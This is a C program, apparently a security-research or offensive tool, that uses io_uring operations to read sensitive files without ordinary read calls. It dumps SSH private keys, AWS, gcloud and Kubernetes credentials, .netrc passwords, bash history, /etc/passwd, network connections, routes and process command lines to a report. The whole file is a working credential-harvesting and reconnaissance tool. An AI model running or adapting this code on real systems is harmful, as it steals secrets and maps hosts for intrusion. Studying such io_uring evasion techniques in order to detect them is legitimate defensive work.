#define _GNU_SOURCE
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pwd.h>
#include <dirent.h>

#include "../io_uring/iouring_utils.h"

#define MAX_READ (64 * 1024)

static FILE *outf = NULL;

static void emit(const char *header, const char *data, ssize_t len)
{
    FILE *f = outf ? outf : stdout;
    fprintf(f, "\n=== %s ===\n", header);
    if (len > 0)
        fwrite(data, 1, (size_t)len, f);
    else
        fprintf(f, "(vazio ou inacessivel)\n");
}

static ssize_t uring_read_path(struct uring *u, const char *path,
                                char *buf, size_t bufsz)
{
    struct io_uring_sqe *sqe;
    struct io_uring_cqe cqe;

    sqe = uring_get_sqe(u);
    sqe->opcode     = IORING_OP_OPENAT;
    sqe->fd         = AT_FDCWD;
    sqe->addr       = (uint64_t)(uintptr_t)path;
    sqe->open_flags = O_RDONLY;
    uring_submit_wait(u, 1);
    uring_peek_cqe(u, &cqe);
    if ((int)cqe.res < 0) return (ssize_t)cqe.res;
    int fd = (int)cqe.res;

    sqe = uring_get_sqe(u);
    sqe->opcode = IORING_OP_READ; sqe->fd = fd;
    sqe->addr   = (uint64_t)(uintptr_t)buf;
    sqe->len    = (uint32_t)(bufsz - 1); sqe->off = 0;
    uring_submit_wait(u, 1);
    uring_peek_cqe(u, &cqe);
    ssize_t n = (ssize_t)cqe.res;
    if (n > 0) buf[n] = '\0';

    sqe = uring_get_sqe(u); sqe->opcode = IORING_OP_CLOSE; sqe->fd = fd;
    uring_submit_wait(u, 1); uring_peek_cqe(u, &cqe);
    return n;
}

static void list_fds(pid_t pid)
{
    char dir[64]; snprintf(dir, sizeof(dir), "/proc/%d/fd", pid);
    DIR *d = opendir(dir); if (!d) return;

    FILE *f = outf ? outf : stdout;
    fprintf(f, "\n=== /proc/%d/fd ===\n", pid);
    struct dirent *de;
    while ((de = readdir(d))) {
        if (de->d_name[0] == '.') continue;
        char link[64], target[256] = {};
        snprintf(link, sizeof(link), "/proc/%d/fd/%s", pid, de->d_name);
        readlink(link, target, sizeof(target) - 1);
        fprintf(f, "  fd%-4s -> %s\n", de->d_name, target);
    }
    closedir(d);
}

static void parse_tcp(const char *data, ssize_t len)
{
    FILE *f = outf ? outf : stdout;
    if (len <= 0) return;
    fprintf(f, "\n=== conexoes TCP (/proc/net/tcp) ===\n");
    fprintf(f, "%-22s %-22s %-8s\n", "LOCAL", "REMOTO", "STATE");

    const char *p = data, *end = data + len;
    while (p < end) {
        const char *nl = memchr(p, '\n', (size_t)(end - p));
        if (!nl) break;
        unsigned sl, la, lp, ra, rp, st;
        if (sscanf(p, " %u: %X:%X %X:%X %X", &sl, &la, &lp, &ra, &rp, &st) == 6
            && st != 0x0A ) {
            fprintf(f, "  %u.%u.%u.%u:%-5u  %u.%u.%u.%u:%-5u  0x%02x\n",
                    la&0xff,(la>>8)&0xff,(la>>16)&0xff,(la>>24)&0xff, lp,
                    ra&0xff,(ra>>8)&0xff,(ra>>16)&0xff,(ra>>24)&0xff, rp, st);
        }
        p = nl + 1;
    }
}

static void scan_cmdlines(struct uring *u)
{
    FILE *f = outf ? outf : stdout;
    fprintf(f, "\n=== processos acessiveis (/proc/PID/cmdline) ===\n");

    DIR *d = opendir("/proc");
    if (!d) return;

    struct dirent *de;
    char path[64], buf[4096];
    while ((de = readdir(d))) {
        if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
        snprintf(path, sizeof(path), "/proc/%s/cmdline", de->d_name);
        ssize_t n = uring_read_path(u, path, buf, sizeof(buf));
        if (n <= 0) continue;
        for (ssize_t i = 0; i < n - 1; i++) if (!buf[i]) buf[i] = ' ';
        fprintf(f, "  pid=%-6s  %s\n", de->d_name, buf);
    }
    closedir(d);
}

int main(int argc, char *argv[])
{
    const char *outpath = NULL;
    for (int i = 1; i < argc - 1; i++)
        if (strcmp(argv[i], "--out") == 0) outpath = argv[++i];

    if (outpath) {
        outf = fopen(outpath, "w");
        if (!outf) { perror("fopen"); return 1; }
        printf("[*] writing to %s\n", outpath);
    }

    struct passwd *pw = getpwuid(getuid());
    const char *home  = pw ? pw->pw_dir : "/tmp";

    printf("[*] uid=%d home=%s\n", getuid(), home);

    struct uring u = {};
    if (uring_init(&u, 32) < 0) { perror("uring_init"); return 1; }

    char *buf = malloc(MAX_READ);
    ssize_t n;

    n = uring_read_path(&u, "/proc/net/tcp", buf, MAX_READ);
    parse_tcp(buf, n);

    n = uring_read_path(&u, "/proc/net/arp", buf, MAX_READ);
    emit("/proc/net/arp (hosts na rede local)", buf, n);

    n = uring_read_path(&u, "/proc/net/route", buf, MAX_READ);
    emit("/proc/net/route (tabela de rotas)", buf, n);

    n = uring_read_path(&u, "/etc/hosts", buf, MAX_READ);
    emit("/etc/hosts", buf, n);

    n = uring_read_path(&u, "/etc/passwd", buf, MAX_READ);
    emit("/etc/passwd (usuarios)", buf, n);

    char path[512];

    snprintf(path, sizeof(path), "%s/.bash_history", home);
    n = uring_read_path(&u, path, buf, MAX_READ);
    emit("~/.bash_history", buf, n);

    snprintf(path, sizeof(path), "%s/.ssh/known_hosts", home);
    n = uring_read_path(&u, path, buf, MAX_READ);
    emit("~/.ssh/known_hosts", buf, n);

    snprintf(path, sizeof(path), "%s/.ssh/id_rsa", home);
    n = uring_read_path(&u, path, buf, MAX_READ);
    emit("~/.ssh/id_rsa", buf, n);

    snprintf(path, sizeof(path), "%s/.ssh/id_ed25519", home);
    n = uring_read_path(&u, path, buf, MAX_READ);
    emit("~/.ssh/id_ed25519", buf, n);

    snprintf(path, sizeof(path), "%s/.aws/credentials", home);
    n = uring_read_path(&u, path, buf, MAX_READ);
    emit("~/.aws/credentials", buf, n);

    snprintf(path, sizeof(path), "%s/.kube/config", home);
    n = uring_read_path(&u, path, buf, MAX_READ);
    emit("~/.kube/config (kubernetes)", buf, n);

    snprintf(path, sizeof(path), "%s/.config/gcloud/application_default_credentials.json", home);
    n = uring_read_path(&u, path, buf, MAX_READ);
    emit("gcloud credentials", buf, n);

    snprintf(path, sizeof(path), "%s/.gitconfig", home);
    n = uring_read_path(&u, path, buf, MAX_READ);
    emit("~/.gitconfig", buf, n);

    snprintf(path, sizeof(path), "%s/.netrc", home);
    n = uring_read_path(&u, path, buf, MAX_READ);
    emit("~/.netrc (senhas plaintext)", buf, n);

    list_fds(getpid());

    scan_cmdlines(&u);

    free(buf);
    uring_free(&u);
    if (outf) { fclose(outf); printf("[*] done → %s\n", outpath); }
    return 0;
}
